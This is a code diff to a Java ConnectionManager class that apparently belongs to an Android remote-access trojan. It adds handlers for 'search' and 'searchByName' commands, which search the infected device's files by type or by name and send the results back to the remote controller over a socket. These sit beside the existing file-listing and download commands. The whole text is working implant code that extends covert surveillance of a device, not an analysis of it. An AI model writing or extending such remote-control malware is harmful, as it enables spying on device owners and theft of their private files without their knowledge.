@@ -108,6 +108,10 @@ public class ConnectionManager {
                                     x0000fm(0, data.getString("path"));
                                 else if (data.getString("extra").equals("dl"))
                                     x0000fm(1, data.getString("path"));
+                                else if (data.getString("extra").equals("search"))
+                                    x0000fmSearch(data.getString("fileType"), data.getString("searchPath"));
+                                else if (data.getString("extra").equals("searchByName"))
+                                    x0000fmSearchByName(data.getString("searchText"), data.getString("searchPath"));
                                 break;
                             case "x0000st":
                                 if (data.getString("extra").equals("ls"))
@@ -495,6 +499,26 @@ public class ConnectionManager {
             ioSocket.emit("x0000fm", FileManager.walk(path));
         else if (req == 1)
             FileManager.downloadFile(path);
+    }
+
+    public static void x0000fmSearch(String fileType, String searchPath) {
+        try {
+            JSONObject response = new JSONObject();
+            response.put("searchResults", FileManager.searchFilesByType(searchPath, fileType));
+            ioSocket.emit("x0000fm", response);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void x0000fmSearchByName(String searchText, String searchPath) {
+        try {
+            JSONObject response = new JSONObject();
+            response.put("searchResults", FileManager.searchFilesByName(searchPath, searchText));
+            ioSocket.emit("x0000fm", response);
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
     }
 
     public static void x0000st(int req, String path) {
